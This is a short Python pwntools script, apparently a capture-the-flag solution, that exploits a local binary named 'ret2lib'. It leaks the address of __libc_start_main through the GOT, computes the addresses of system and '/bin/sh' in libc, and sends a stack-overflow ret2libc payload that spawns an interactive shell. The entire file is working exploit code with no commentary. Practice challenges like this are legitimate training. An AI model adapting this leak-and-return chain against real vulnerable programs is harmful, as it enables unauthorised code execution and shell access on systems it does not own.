#!/usr/bin/env python

# -*- conding : utf-8

from pwn import *
# from LibcSearcher
# context.log_level = 'debug'
io = process("./ret2lib")
elf = ELF("./ret2lib")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

main_got = elf.got["__libc_start_main"]
main_libc = libc.symbols["__libc_start_main"]
sys_libc = libc.symbols["system"]
bin_libc = libc.search("/bin/sh").next()
# print str(main_got)
io.recvuntil(":")
io.sendline(str(main_got))
io.recvuntil(": ")
main_addr = eval(io.recv(10))
sys_addr = main_addr - main_libc + sys_libc
bin_addr = main_addr - main_libc + bin_libc

payload = 'a' * (0x38 + 4)
payload += p32(sys_addr) + p32(main_got) + p32(bin_addr)

io.recvuntil("me :")
io.sendline(payload)
io.interactive()
io.close()


